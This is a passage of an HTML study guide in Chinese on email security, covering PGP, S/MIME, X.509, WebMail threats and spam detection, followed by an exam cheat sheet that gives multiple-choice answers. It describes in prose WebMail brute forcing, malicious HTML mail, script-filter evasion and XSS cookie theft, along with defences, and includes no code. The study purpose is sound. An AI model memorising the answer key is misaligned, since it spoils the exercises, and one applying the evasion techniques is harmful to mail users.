+⑤ <b>SMTP 的开放中继被滥用</b>：垃圾邮件制造者<b>收集网络上存在的开放中继地址，利用 SMTP 协议的漏洞，使用开放中继来完成垃圾邮件的发送</b><span class="bref">p.322</span>，由此产生<b>垃圾邮件与邮件炸弹</b>。<br>
+⑥ <b>可传播恶意代码</b>：可通过邮件信息、特别是<b>邮件附件</b>传播病毒、木马、蠕虫，是 <b>APT 攻击最常使用的手段</b>。<br>
+⑦ <b>WebMail 场景下</b>，若只用 HTTP 而非 HTTPS，<b>登录的用户名和口令也是明文传输</b>，可被直接抓包获取。</div></div>
+
+<div class="q big"><div class="qt"><span class="qn">2.</span>在 PGP 中，发送方执行签名、加密、压缩操作的顺序是什么？为什么要按这样的顺序进行？</div>
+<div class="ans"><b>答</b>　<b>顺序：先签名 → 再压缩 → 最后加密</b>（完整链条为：散列 → 签名 → 与正文拼接 → 压缩 → 对称加密 → 与加密的会话密钥拼接 → Base64 编码 → 分段）。<span class="bref">p.312</span><br>
+<b>（一）签名为什么排在压缩之前，有两点原因：</b><br>
+① <b>便于验证</b>：对<b>没压缩</b>的消息进行签名，可便于对签名的验证；如果在压缩后再签名，则需要<b>保存压缩后的消息</b>，或在验证时<b>重新压缩消息</b>，增加了处理的工作量。<br>
+② <b>压缩结果不唯一</b>：压缩算法 ZIP 在<b>不同的实现</b>中会在<b>运算速度和压缩率之间寻求平衡</b>，因而<b>可能会产生不同的压缩结果</b>（虽然直接解压结果相同），因此压缩后再签名<b>可能导致无法实现鉴别</b>——接收方验证签名时可能会因压缩的原因而出现<b>验证失败</b>。<br>
+<b>（二）压缩为什么排在加密之前，也有两点原因：</b><br>
+① <b>省资源</b>：先压缩再加密<b>缩短了报文大小</b>，从而<b>减少了网络传输时间和存储空间</b>。<br>
+② <b>更安全</b>：经过压缩实际上是经过了一次变换，变换后<b>减少了明文中上下文的关系，比原始消息的冗余信息更少，再加密的安全性更高</b>；而如果先加密再压缩，效果会差一些（补充：密文接近随机数，几乎压不动）。</div></div>
+
+<div class="q big"><div class="qt"><span class="qn">3.</span>在密钥信任方面，X.509 和 PGP 有什么不同？</div>
+<div class="ans"><b>答</b>　核心差别是<b>「信任从哪里来」</b>：X.509 是<b>自上而下</b>的权威传递，PGP 是<b>横向</b>的熟人扩散。<span class="bref">p.315–316、p.311</span>
+<table class="tight" style="margin:.3em 0">
+<thead><tr><th style="width:16%">对比项</th><th style="width:40%">X.509（PKI，S/MIME 采用）</th><th>PGP</th></tr></thead>
+<tbody>
+<tr><td><b>信任模型</b></td><td><b>层次化 / 树状结构</b>，以 CA 为中心</td><td><b>以用户为中心的信任模型</b>，即<b>信任网 Web of Trust</b>，网状结构</td></tr>
+<tr><td><b>谁能签公钥</b></td><td>由<b>上一级的组织（CA）负责认证</b>下一级的组织和个人</td><td><b>没有统一的认证中心，每个人都可以作为一个 CA 对某个用户的公钥签名</b></td></tr>
+<tr><td><b>信任的依据</b></td><td>信任<b>根 CA</b>，沿证书链自上而下传递</td><td>两点：① <b>直接来自你所信任的人的公钥</b>；② <b>由你所信任的人为你并不熟悉的人所签署的公钥</b></td></tr>
+<tr><td><b>信任的粒度</b></td><td>基本是<b>二值</b>的：证书有效 / 无效</td><td><b>多级且可加权</b>：拥有者可信性分<b>不信任、部分信任、一直信任、绝对信任</b>四档，由用户自定；密钥合法性由<b>加权和 ≥ 1</b> 计算得出</td></tr>
+<tr><td><b>撤销机制</b></td><td>有<b>严格的证书撤销机制</b></td><td><b>缺少 PKI 那样严格的证书撤销机制</b>，靠所有者自行发布公钥撤销证书，<b>是 PGP 安全体系中比较薄弱的环节</b></td></tr>
+<tr><td><b>适用场景</b></td><td><b>比较适合具有层次结构的组织使用</b></td><td>适合<b>个人之间、没有统一权威</b>的场合</td></tr>
+</tbody>
+</table>
+<span class="small">补充：<b>PGP 后来也支持 X.509 和 CA 认证中心，但并没有被广泛采用</b>，因此 PGP 的公钥管理主要还是采用信任网模型。</span></div></div>
+
+<div class="q big"><div class="qt"><span class="qn">4.</span>简述 PGP 中会话密钥的产生过程。</div>
+<div class="ans"><b>答</b><span class="bref">p.314</span>　会话密钥 K<sub>s</sub> 由<b>伪随机数生成器 PRG</b> 产生，该 PRG 基于美国国家标准<b>「金融机构密钥管理（大规模）」ANSI X 9.17</b> 中定义的随机数生成方法，产生 <b>128 位</b>随机数，<b>只用于一条消息的一次加解密过程</b>。具体过程：<br>
+① <b>随机数产生器的输入</b>包括：<b>1 个 128 位密钥</b>和 <b>2 个 64 位待加密的明文块（随机数种子）</b>。<br>
+② <b>种子的产生</b>：随机数种子<b>由键盘输入产生</b>（用户应尽量随机无规律地击键）。用户随机键入 <b>12 个字符</b>，将键入的每一个字符表示成 <b>8 比特</b>的数值，<b>12 个字符共 96 比特</b>，<b>再加上表示键入日期/时间的 32 比特</b>，形成<b>一个 128 比特的随机数据流</b>。<br>
+③ 然后将此数据流<b>分成两个 64 比特的明文分组</b>，输入随机数产生器中；<b>128 位密钥为上一次算法输出的会话密钥</b>。<br>
+④ 随机数产生器根据输入的种子和密钥<b>产生 2 个 64 位密文块，串联起来形成 128 位的会话密钥</b>。<br>
+<span class="small">（ANSI X 9.17 最初规定的加密算法是 DES，后续标准中增加了 3DES、IDEA、CAST-128、AES 等。）</span><br>
+⑤ <b>安全交换</b>：会话密钥使用<b>接收方的公开密钥加密</b>后发送给接收方，接收方收到后<b>用自己的私钥解密</b>得到本次会话的会话密钥。<b>PGP 通过这种方法实现了会话密钥的安全交换。</b></div></div>
+
+<div class="q big"><div class="qt"><span class="qn">5.</span>简述在 PGP 中，密钥合法性字段的取值计算方法，并举例说明。</div>
+<div class="ans"><b>答</b><span class="bref">p.316</span>　<b>密钥合法性字段的取值，由此公钥的所有签名的「签名可信性字段」的取值计算得到。</b>计算方法如下：<br>
+① <b>如果该公钥的签名可信性字段中至少有一个标志为「绝对信任」，则将此公钥的密钥合法性字段标志为「合法」。</b><br>
+② <b>否则，PGP 计算所有签名信任值的加权和</b>：签名可信性字段标志为<b>「一直信任」的权重为 1/X</b>，标志为<b>「部分信任」的权重为 1/Y</b>，其中 <b>X 和 Y 是用户设置的参数</b>。<b>当加权和等于或大于 1 时，将密钥合法性字段标志为「合法」，即公钥是有效的。</b><br>
+③ 因此，在没有绝对信任的情况下，<b>需要至少 X 个签名是可信的（一直信任），或者至少 Y 个签名是可信的（部分信任），或者上述两种情况的某种组合</b>。<br>
+<b>举例（课本原例）</b>：设 <b>X = 1，Y = 2</b>，则<b>一个「一直信任」的密钥拥有者签名的公钥即为合法密钥</b>；<b>两个「部分信任」的密钥拥有者签名的公钥也为合法密钥</b>。<br>
+<b>再举一例</b>：设 <b>X = 2，Y = 4</b>（一直信任记 1/2，部分信任记 1/4）——<br>
+・2 个"一直信任"：1/2 + 1/2 = 1 ≥ 1，<b>合法</b>；<br>
+・4 个"部分信任"：4 × 1/4 = 1 ≥ 1，<b>合法</b>；<br>
+・1 个"一直信任" + 2 个"部分信任"：1/2 + 1/4 + 1/4 = 1 ≥ 1，<b>合法</b>（即上述的"某种组合"）；<br>
+・1 个"一直信任" + 1 个"部分信任"：1/2 + 1/4 = 3/4 &lt; 1，<b>不合法</b>。<br>
+<b>特例</b>：若某用户是<b>拥有一个或多个未知用户签名的孤立用户</b>（公钥从公钥服务器上取得），<b>由于没有信任者的签名，PGP 认为该用户的公钥是不合法的</b>。</div></div>
+
+<div class="q big"><div class="qt"><span class="qn">6.</span>简要说明 WebMail 所面临的安全问题。</div>
+<div class="ans"><b>答</b><span class="bref">10.4 节</span>　WebMail 用浏览器充当邮件用户代理，因此<b>Web 应用面临的很多安全问题同样在 WebMail 中存在</b>。主要有三类：<br>
+<b>① WebMail 暴力破解。</b>WebMail 的密码验证是<b>以提交表单</b>的形式交由服务端程序（CGI、ASP 等）处理的，攻击者借助 <b>wwwhack、小榕的溯雪</b>等工具<b>不断用不同的密码尝试登录，通过比较返回页面的异同判断是否破解成功</b>。防范措施有<b>禁用账户、禁止 IP 地址、登录检验（验证码）</b>三种，但各有缺陷：禁用账户可能被利用形成 <b>DoS 攻击</b>；禁止 IP 会<b>误伤共用同一 IP 的网吧、公司、学校用户</b>，且攻击者可用多个代理轮换或分布式破解绕过；登录检验的字符串若在页面文本中<b>可被工具提取后再提交</b>（因此检验字符串<b>最好包含在文件名随机的图片中</b>）。最终仍<b>主要靠用户自己采取良好的密码策略</b>。<br>
+<b>② 恶意 HTML 邮件。</b>HTML 邮件可含字体、链接、图像、声音等。利用它攻击者能进行<b>电子邮件欺骗，甚至欺骗用户更改自己的邮箱密码</b>（预先给"新密码"表单元素赋值，诱骗用户提交）；在 HTML 邮件中<b>嵌入恶性脚本程序</b>（JavaScript / VBScript，调用 ActiveX 控件或结合 WSH），能<b>修改注册表、非法操作文件、格式化硬盘、耗尽系统资源、修改"开始"菜单，甚至删除和发送用户的邮件、访问用户的地址簿、修改邮箱账户密码</b>。攻击者还可通过<b>事件属性、把 URI 资源类型设为 javascript、SGML 字符引用（转十六进制）、样式表 @import</b> 等方式<b>绕过 WebMail 的脚本过滤</b>，或用 <b>refresh、iframe、scriptlet</b> 在用户打开邮件时<b>引入另一个含恶意代码的 HTML 文件</b>，从而同时避开脚本过滤与防毒查杀。<b>注意：WebMail 系统会过滤，但 POP3 服务器上并不过滤</b>，用客户端收信仍要谨防。<br>
+<b>③ Cookie 会话攻击。</b>WebMail 需进行<b>用户会话跟踪</b>（Cookie 会话跟踪、URL 会话跟踪）。攻击者一旦获取用户的 Cookie 信息就能<b>很容易地侵入用户的 WebMail 邮箱</b>；获取方法主要有<b>内网监听和 XSS（跨站脚本）攻击</b>——含恶性脚本的 HTML 邮件可<b>先提取当前 WebMail 的 Cookie，赋值给某个表单元素，再自动提交给攻击者</b>。其中<b>持久型 Cookie 只需复制到攻击者自己的 Cookie 文件中即可使用</b>；临时 Cookie 存于内存不易存取，攻击者可借助 <b>HTTP 代理程序 Achilles</b> 截取并编辑。防范：<b>WebMail 系统应避免使用持久型 Cookie 会话跟踪</b>；用户应<b>设置浏览器的 Cookie 安全级别、使用 Cookie 管理工具（Cookie Pal、Burnt Cookie）、及时给浏览器打补丁</b>。</div></div>
+
+<div class="q big"><div class="qt"><span class="qn">7.</span>比较分析基于地址的垃圾邮件检测、基于内容的垃圾邮件检测以及基于行为的垃圾邮件检测方法的优缺点。</div>
+<div class="ans"><b>答</b>　三者的判断依据分别是<b>「谁发的」「写了什么」「怎么发的」</b>。<span class="bref">10.5.1–10.5.3</span><br>
+<b>① 基于地址的检测</b>（黑白名单检测、反向域名验证）。<br>
+<b>优点</b>：是<b>常用、简单、快捷、有效</b>的检测方法；白名单还具有<b>操作简易、方便实施、系统负载小</b>的优点，被广泛用于<b>降低误判率</b>。<br>
+<b>缺点</b>：黑名单<b>不可能涵盖所有的垃圾邮件地址，容易"殃及无辜"，致使用户丢失合法邮件，总体效率不高</b>；且垃圾邮件发送者会<b>伪装、编造和盗用源地址</b>不断变换地址，<b>静态黑名单很难应对，必须不断动态更新</b>。白名单<b>"门槛"低，大量垃圾邮件涌入，经常达不到预期效果</b>。反向域名验证则因<b>大部分 DNS 服务器没有开放反向解析查询权限，误判率较高，严重影响正常使用，很难被推广</b>。<b>实际应用中黑白名单通常结合使用。</b><br>
+<b>② 基于内容的检测</b>（分布式协作法、规则过滤法、统计过滤法、关键字过滤法）。<br>
+<b>优点</b>：直接分析邮件本体，<b>针对性强</b>。分布式协作法对<b>大范围爆发的蠕虫等病毒入侵式垃圾邮件拦截效果很好</b>（此类邮件数量大、易分析、极相似、变化小）；规则过滤法<b>规则便于人理解、原理简单、易于操作</b>；统计过滤法<b>可自适应学习建立识别模型</b>；关键字过滤法<b>能有效识别一些主题明显的垃圾邮件</b>。<br>
+<b>缺点</b>：普遍存在<b>检测依据需要不断更新、特征提取及匹配的计算量比较大</b>的问题，且<b>必须打开邮件内容</b>。具体地：分布式协作法在<b>垃圾邮件小规模传送、内容变化很大时很难发挥作用</b>，且<b>需要用户自行上报而很多用户没有上报习惯</b>；规则过滤法<b>需长时间手动维护调整规则、主观因素较多、缺乏灵活性、不利于及时更新、对用户技术能力要求较高、误判率较高，较适合作为辅助手段</b>；统计过滤法<b>分类模型具有非共享性，一个用户训练出的模型很难适应另一个用户，推广性较差</b>；关键字过滤法<b>需要建立数量庞大的关键字列表，准确率与词汇表完备性密切相关，词汇表太大又会消耗服务器大量系统资源</b>。<br>
+<b>③ 基于行为的检测</b>（邮件通信拓扑相似性、邮件用户社交关系、SMTP 连接行为）。<br>
+<b>优点</b>（正是为弥补前两类的局限而提出）：① <b>不必完整接收邮件，不必查看邮件中的具体内容</b>；② <b>由于与邮件内容无关，避免了对邮件内容异常烦琐的分析和计算</b>；③ <b>大大减轻了网络资源的占用，提高了垃圾邮件过滤系统的处理能力和速度</b>；④ <b>由于不用打开邮件内容，避免了对个人隐私的侵犯</b>。<br>
+<b>缺点</b>：需要<b>获取大量邮件发送样本的行为信息进行分析、学习和训练</b>才能建立行为识别模型，建模成本高；判据是统计规律，对<b>刻意模仿正常行为、低速小量发送</b>的垃圾邮件不敏感；而且<b>只看行为不看内容，无法判断邮件本身内容是否违法有害</b>。<br>
+<b>结论</b>：三类方法各有局限，<b>实际的反垃圾邮件系统总是把它们组合起来使用</b>。</div></div>
+
+<div class="q big"><div class="qt"><span class="qn">8.</span>比较分析 PEM、S/MIME、PGP 的优缺点。</div>
+<div class="ans"><b>答</b><span class="bref">p.310–311</span>　三者是端到端安全电子邮件的三种方案，<b>各自使用不同的安全方案，相互不兼容，导致无法实现互操作</b>。<br>
+<b>① PEM（隐私增强电子邮件）</b>。美国 RSA 实验室基于 <b>RSA 和 DES</b> 算法开发。<br>
+<b>优点</b>：出现最早；在电子邮件标准格式上一次性增加了<b>加密、认证、消息完整性保护和密钥管理</b>四项功能，功能完整。<br>
+<b>缺点</b>：① <b>由于 PEM 在 MIME 之前提出，因此并不支持 MIME，只支持文本信息</b>（无法处理附件和二进制数据）；② <b>依赖于 PKI 并遵循 X.509 认证协议，而当时要建立一个可用的 PKI 并不容易</b>。→ 未能推广。<br>
+<b>② S/MIME（安全/多用途因特网邮件扩展）</b>。在 PEM 基础上发展，使用 RSA 提出的 <b>PKCS</b> 和 <b>MIME</b>，对邮件主体进行完整性保护、签名和加密后<b>作为特殊的附件发送</b>。<br>
+<b>优点</b>：① <b>支持 MIME</b>，可处理任意类型数据；② <b>不仅用于安全电子邮件传输，任何支持 MIME 格式的数据传输机制或协议（如 HTTP）均可使用它</b>；③ <b>获得了广泛的行业支持，已经内置于大多数电子邮件客户端软件（如 Outlook、Foxmail）和 Web 浏览器中</b>。<br>
+<b>缺点</b>：<b>认证机制依赖于层次结构的证书认证机构</b>，所有下一级的组织和个人的证书由上一级的组织负责认证，<b>整个信任关系是树状结构，因此比较适合具有层次结构的组织使用</b>——个人用户需向 CA 申请证书，使用门槛较高、灵活性差。<span class="small">（另：相关 RFC 2311/2312/3850/3851 <b>是信息文件，而不是标准或建议的标准</b>。）</span><br>
+<b>③ PGP（优良隐私保护）</b>。1991 年由菲利普·齐默尔曼开发，<b>既是一个特定的安全电子邮件应用软件，也是一个安全电子邮件标准</b>。<br>
+<b>优点</b>：① <b>没有采用严格（类似 PKI）的公钥管理方案，而是提供了一种解决公钥管理问题的框架，并给出几种可选方案供用户选择</b>，采用<b>信任网</b>，<b>不需要统一的 CA，个人用户直接可用、部署灵活</b>；② <b>只对邮件正文处理，对邮件系统的体系结构及收发协议不做任何修改，只要收发双方的用户代理支持 PGP 即可，无须更改邮件服务器</b>；③ 有 <b>OpenPGP 开放标准和 GnuPG（GPG）免费实现</b>，跨平台生态丰富；④ <b>不限于电子邮件，可用于任何需要保证传输机密性、完整性和认证的应用</b>。<br>
+<b>缺点</b>：① <b>信任网依赖用户主观设置信任级别，难以规模化，公钥合法性判断不够客观</b>；② <b>缺少 PKI 体系那样严格的证书撤销机制，很难确保没有人使用一个已不安全的密钥，是 PGP 安全体系中比较薄弱的环节</b>；③ <b>PGP 属于商业软件</b>（早期免费，从 8.1 版开始收费）；④ 默认使用 <b>SHA-1</b> 做身份认证的旧版本已被 <b>2019 年的 SHA-1 选择前缀冲突攻击</b>攻破（GnuPG 2.2.18 起将 2019-01-19 之后基于 SHA-1 创建的身份签名视为无效）。</div></div>
+
+<div class="q big"><div class="qt"><span class="qn">9.</span>现有的加密电子邮件解决方案，如 S/MIME、PGP 等，大都是对邮件正文进行安全处理的。分析这样设计的原因。</div>
+<div class="ans"><b>答</b>　主要有三方面原因：<br>
+① <b>为了不改动现有邮件系统，实现"可增量部署"。</b><span class="bref">p.314</span> 课本原话：<b>「由于 PGP 只是对邮件正文进行处理，而对邮件系统的体系结构及收发协议没有做任何修改，因此，只要收发双方的用户代理支持 PGP，就可在现有的邮件系统中进行安全的电子邮件交换，而无须对邮件服务器进行任何更改。」</b>——全世界的邮件服务器不可能同时升级，把改动限制在<b>两端的用户代理</b>里，是唯一可行的路线。<br>
+② <b>邮件的信封和首部在功能上必须保持明文。</b>邮件的传输程序<b>要根据信封上的信息（尤其是收信人地址）来传送邮件</b>，邮件服务器还要靠域名查 <b>DNS 的 MX 记录</b>来路由。如果把收发件人地址、路由信息一起加密，<b>中间的邮件服务器就无法投递、无法路由</b>，邮件根本走不出去。<br>
+③ <b>安全属性的需求本来就集中在正文上。</b>四项安全需求（机密性、完整性、不可否认性、真实性）保护的对象是<b>邮件的内容</b>；至于"谁在什么时候给谁发过信"这类<b>元数据的保护</b>，超出了端到端邮件加密的目标范围，需要靠<b>传输层/网络层的安全协议（SSL/TLS、IPsec）</b>另行解决。<br>
+<b>代价（可作为补充）</b>：正因如此，PGP/S-MIME <b>无法隐藏通信关系（谁和谁通信、主题、时间）</b>，这是端到端邮件加密公认的局限。</div></div>
+
+<div class="q big"><div class="qt"><span class="qn">10.</span>在密码学中有多种保护对称的会话密钥安全分发的方法。请分别说明 PGP、Needham-Schroeder 协议、SSL 协议是如何保护会话密钥的安全分发的？其中哪些使用的是数字信封技术？</div>
+<div class="ans"><b>答</b><br>
+<b>① PGP</b>：发送方用<b>伪随机数生成器随机产生一次性会话密钥 K<sub>s</sub></b>（<b>不需要和接收方协商密钥，且只用一次</b>），然后<b>用接收方的公开密钥 PU<sub>B</sub> 对 K<sub>s</sub> 加密</b>，把加密后的 K<sub>s</sub> 与用 K<sub>s</sub> 加密的报文<b>拼接在一起发送</b>；接收方<b>用自己的私钥 PR<sub>B</sub> 解密得到 K<sub>s</sub></b>，再用 K<sub>s</sub> 解密报文。<b>属于数字信封。</b><span class="bref">p.312、p.314</span><br>
+<b>② Needham-Schroeder 协议</b>：依靠<b>可信第三方 KDC（密钥分发中心）</b>。通信双方 A、B <b>各自与 KDC 预先共享一个对称主密钥</b>；A 向 KDC 请求与 B 通信，<b>KDC 生成会话密钥 K<sub>s</sub>，分别用与 A、与 B 共享的主密钥加密后分发</b>（发给 A 的那份里还包含"转交给 B 的票据"）。协议中使用<b>随机数（nonce）来防止重放攻击</b>。<b>全程只使用对称密码算法，不使用公开密码算法，因此不属于数字信封。</b><br>
+<b>③ SSL / TLS 协议</b>：在握手阶段，若采用 <b>RSA 密钥交换</b>，则<b>客户端生成预主密钥（pre_master_secret），用服务器证书中的公钥加密后发送给服务器</b>，服务器用自己的私钥解密；双方再由预主密钥＋双方随机数导出主密钥和各项会话密钥。<b>这一步属于数字信封。</b><span class="small">（若采用 DH/ECDHE 密钥协商模式，则是双方协商生成，此时不属于数字信封。）</span><br>
+<b>结论：使用数字信封技术的是 PGP 和 SSL（RSA 密钥交换模式）；Needham-Schroeder 协议不是。</b><br>
+<span class="small">→ 对应<b>单选 14</b>：没有采用公开密码算法进行对称会话密钥分发的正是 <b>Needham-Schroeder</b>。</span></div></div>
+
+<div class="q big"><div class="qt"><span class="qn">11.</span>众所周知，RSA 加密比较长的明文时速度很慢，PGP 却有两处使用了 RSA 进行加密操作，为什么？既然可以使用 RSA 实现数据的机密性保护，为什么在 PGP 中却使用对称加密算法（如 IDEA）对邮件数据进行加密？</div>
+<div class="ans"><b>答</b><br>
+<b>（一）为什么两处用 RSA 不要紧——因为这两处的数据都很短、且长度固定。</b><br>
+PGP 中使用 RSA 的两处是：<br>
+・<b>数字签名</b>：<b>不是对整封邮件签名，而是先用单向散列函数（如 SHA-1）算出消息的散列值，再对这个散列值签名</b>。散列值是<b>定长的短数据</b>（SHA-1 为 160 比特），做一次公钥运算的开销可以接受。<br>
+・<b>加密会话密钥</b>：<b>用接收方的公钥加密的只是 128 位的会话密钥 K<sub>s</sub></b>，也是定长的短数据。<br>
+也就是说，<b>RSA 在 PGP 中只作用在"短小的定长数据"上，从不直接作用在长度不可控的邮件正文上</b>，因此"RSA 慢"这个缺点被规避掉了。<br>
+<b>（二）为什么邮件数据要用对称算法——性能与密钥分发的双重考虑。</b><br>
+・<b>性能</b>：公开密码算法基于大数模幂等复杂运算，速度<b>远低于</b>对称密码算法。邮件正文长度不可预知，可能很大，<b>用 RSA 直接加密在实际中不可行</b>。<br>
+・<b>密钥分发</b>：如果只用对称算法，又会遇到"这把对称密钥怎么安全地送给对方"的老问题。<b>PGP 的解法是把两者组合起来</b>——课本原话：<b>「PGP 用公开密码算法对会话密钥 K<sub>s</sub> 进行加密（使用接收方的公钥 PU<sub>B</sub>），然后用对称密码算法对压缩后的报文进行加密（使用会话密钥 K<sub>s</sub>）。这种链式加密方法（也称为"数字信封"）既有公开密码体系的保密性，又有对称密码体系的高效性，从而既保证了邮件正文的机密性，又安全地传递了对称密码算法的密钥。」</b><span class="bref">p.312</span><br>
+・<b>附加好处</b>：<b>会话密钥是发送方随机产生的，不需要和接收方协商密钥，且只用一次，即使偶然被泄露，也不会影响到下次邮件的发送过程。</b><br>
+<b>一句话总结：用公钥体制解决"密钥怎么送"，用对称体制解决"数据怎么快速加密"，各取所长。</b></div></div>
+
+<div class="q big"><div class="qt"><span class="qn">12.</span>PGP 为什么要对加密后的报文进行 Base64 编码？并分析编码对传输性能的影响。</div>
+<div class="ans"><b>答</b><span class="bref">p.313</span><br>
+<b>（一）为什么要编码：出于邮件兼容性的考虑。</b><br>
+经过压缩和对称加密之后得到的报文是<b>任意的二进制数据</b>，而<b>很多文件系统（邮件系统）只允许使用 ASCII 字符组成的报文</b>，二进制数据中的某些字节在这些系统中是非法的或有特殊含义，可能被截断或改写。因此 PGP <b>使用 Base64 编码（表 10-2 中称为 Radix 64，也就是 MIME 的 Base64 编码）将报文转换成 ASCII 字符串</b>，从而使<b>邮件应用安全透明</b>——不管中间经过什么邮件系统，报文都能原样通过。<br>
+<b>（二）对传输性能的影响：</b><br>
+① <b>数据量膨胀 33%</b>：<b>「使用 Base64 编码转换后将导致消息大小增加 33%（每 3 字节的二进制数据映射成 4 个 ASCII 字符）」</b>。（4 ÷ 3 − 1 ≈ 33%。）膨胀意味着<b>传输时间变长、占用存储与带宽增加</b>。<br>
+② <b>但实际影响远小于 33%</b>：<b>「由于加密前对消息进行了压缩，因此实际的性能下降幅度要小很多。」</b>——PGP 的处理顺序是<b>先压缩再加密再编码</b>，压缩已经把报文缩小了一大截，Base64 再放大 1/3，两者相抵，最终报文<b>通常仍比原始邮件小或相差不大</b>。<br>
+③ 另外还有<b>编解码本身的少量 CPU 开销</b>，但 Base64 是简单的查表映射，代价可忽略。<br>
+<b>结论：Base64 是用约 33% 的体积代价换取"能在所有邮件系统里通过"的兼容性，而先压缩的设计正好把这个代价对冲掉了大部分。</b></div></div>
+<h2 class="pagebreak"><span class="n">§6</span>考场速查卡</h2>
+
+<p class="lead" style="margin-top:0">进考场先翻这两页定位，再回正文找详解。<b>加黄底的是必须记牢、翻书也不好找的东西。</b></p>
+
+<div class="two">
+
+<div class="cheat">
+<h4>① PGP 顺序（问得最多）</h4>
+<p style="margin:.1em 0"><b class="mark">先签名 → 再压缩 → 最后加密</b></p>
+<p class="small" style="margin:.1em 0">完整链：散列 → 签名 → 拼接 → 压缩 → 对称加密 → 拼上加密的 Ks → <b>Base64</b> → <b>分段</b></p>
+<ul style="margin:.25em 0">
+<li>签名在压缩前：① 对未压缩消息签名<b>便于验证</b>；② <b>ZIP 不同实现结果可能不同</b>，压缩后签名会验签失败</li>
+<li>压缩在加密前：① <b>缩短报文</b>省传输和存储；② <b>减少明文冗余，加密更安全</b>（且密文压不动）</li>
+</ul>
+<p class="small" style="margin:.1em 0">→ 单选 4 = A；简答 2</p>
+</div>
+
+<div class="cheat">
+<h4>② 两个公钥运算，别搞反</h4>
+<ul style="margin:.25em 0">
+<li><b>签名</b>：用<b class="mark">发送方私钥 PR<sub>A</sub></b> 作用在<b>消息散列值</b>上；验签用<b>发送方公钥 PU<sub>A</sub></b></li>
+<li><b>数字信封</b>：用<b class="mark">接收方公钥 PU<sub>B</sub></b> 作用在<b>会话密钥 K<sub>s</sub></b> 上；解开用<b>接收方私钥 PR<sub>B</sub></b></li>
+</ul>
+<p class="small" style="margin:.1em 0"><b>PGP 里公钥运算只有这两处</b>，正文一律用对称算法。<br>
+教材把签名叫成"用私钥加密"只是因为 RSA 里两种运算形式相同；<b>DSS 只能签名不能加密</b>，所以别当真。</p>
+</div>
+
+<div class="cheat">
+<h4>③ PGP 消息格式（图 10-4）</h4>
+<table class="tight" style="margin:.2em 0">
+<tbody>
+<tr><td style="width:34%"><b>会话密钥部分</b><br><span class="small">（可选）</span></td><td>KID<sub>B</sub>、K<sub>s</sub><br><b class="mark">用 PU<sub>B</sub> 加密</b></td></tr>
+<tr><td><b>签名部分</b><br><span class="small">（可选）</span></td><td>时间戳、<b>KID<sub>A</sub></b>、<b>消息摘要的头两个字节</b>（16 位校验序列）、<b>消息摘要</b><br><b class="mark">消息摘要用 PR<sub>A</sub> 加密（签名）</b></td></tr>
+<tr><td><b>报文部分</b></td><td>文件名、时间戳、数据</td></tr>
+<tr><td colspan="2"><b>签名 + 报文</b> → <b>ZIP</b> → <b>用 K<sub>s</sub> 加密</b>；<b>整个消息</b> → <b>Base64</b></td></tr>
+</tbody>
+</table>
+<p class="small" style="margin:.1em 0"><b class="mark">不能用 K<sub>s</sub> 加密的是 KID<sub>B</sub></b>（否则死循环）→ 单选 6 = B</p>
+</div>
+
+<div class="cheat">
+<h4>④ 必记数字</h4>
+<ul style="margin:.25em 0">
+<li>SMTP <b>25</b>　POP3 <b>110</b>　IMAP4 <b>143</b>（都走 TCP）</li>
+<li>会话密钥 <b>128 位</b>，基于 <b>ANSI X 9.17</b>，<b>一次一密</b></li>
+<li>种子：<b>12 字符 × 8 = 96 比特 + 日期/时间 32 比特 = 128 比特</b>；分成 <b>2 个 64 位</b>明文块</li>
+<li>Key ID = 公钥的<b class="mark">低 64 位</b>（2<sup>64</sup> 重复概率极小）</li>
+<li>口令短语 → <b>SHA-1</b> → <b>160 比特</b> → 作 <b>CAST-128</b> 密钥加密私钥</li>
+<li>Base64 膨胀 <b class="mark">33%</b>（3 字节 → 4 字符）</li>
+<li>分段阈值：报文最大长约 <b class="mark">50 000 字节</b></li>
+<li>禁用账户一般 <b>5～10 分钟</b></li>
+</ul>
+</div>
+
+<div class="cheat">
+<h4>⑤ 四项安全需求（<b>没有可用性</b>）</h4>
+<p style="margin:.1em 0"><b>机密性 · 完整性 · 不可否认性 · 真实性</b></p>
+<p class="small" style="margin:.1em 0">PGP 只作用于<b>邮件正文</b>，所以不管可用性 → 单选 3 = A；也建不了 VPN 隧道 → 单选 15 = C</p>
+<h4 style="margin-top:.5em">四类安全措施</h4>
+<p class="small" style="margin:.1em 0">① <b>端到端安全邮件</b>（PEM/S-MIME/PGP，应用层）② <b>传输安全增强</b>（IPsec 网络层 / SSL·TLS 传输层）③ <b>邮件服务器安全增强</b>（含反垃圾）④ 发送方身份验证（SPF/DKIM/DMARC/DANE，PPT 未讲）<br>→ 单选 8「网络层」= <b>D. IPSec</b></p>
+</div>
+
+<div class="cheat">
+<h4>⑥ 三种标准，一句话区分</h4>
+<ul style="margin:.25em 0">
+<li><b>PEM</b>：<b>在 MIME 之前提出 → 不支持 MIME，只支持文本</b>；依赖 PKI 和 X.509 → 没普及</li>
+<li><b>S/MIME</b>：<b>层次化 CA、树状信任</b> → 适合<b>有层级的组织</b>；已内置于客户端和浏览器</li>
+<li><b>PGP</b>：<b>信任网 Web of Trust、以用户为中心</b> → 适合个人；<b>缺严格撤销机制</b></li>
+</ul>
+<p class="small" style="margin:.1em 0"><b>三者互不兼容，无法互操作。</b>→ 单选 2 = D（HTTP 不是安全邮件方案）</p>
+</div>
+
+<div class="cheat">
+<h4>⑦ 信任网三个字段</h4>
+<table class="tight" style="margin:.2em 0">
+<tbody>
+<tr><td style="width:38%"><b>拥有者可信性</b></td><td><b class="mark">用户自己指定</b>：不信任/部分信任/一直信任/绝对信任</td></tr>
+<tr><td><b>签名可信性</b></td><td>PGP 抄自<b>签名者的拥有者可信性</b>；签名者不在公钥环里则记<b>不信任</b></td></tr>
+<tr><td><b>密钥合法性</b></td><td>PGP <b>算</b>出来：合法 / 不合法</td></tr>
+</tbody>
+</table>
+<p style="margin:.15em 0"><b>合法性算法</b>：有一个<b>绝对信任</b> → 直接合法；否则<b class="mark">一直信任记 1/X，部分信任记 1/Y，加权和 ≥ 1 即合法</b>。<br>
+<span class="small">课本例 X=1,Y=2：1 个"一直"或 2 个"部分"即合法。<b>孤立用户（无信任者签名）不合法。</b></span></p>
+<p class="small" style="margin:.1em 0">→ 单选 7 = A、11 = A、12 = B；简答 5</p>
+</div>
+
+<div class="cheat">
+<h4>⑧ WebMail 三大威胁</h4>
+<ol style="margin:.25em 0">
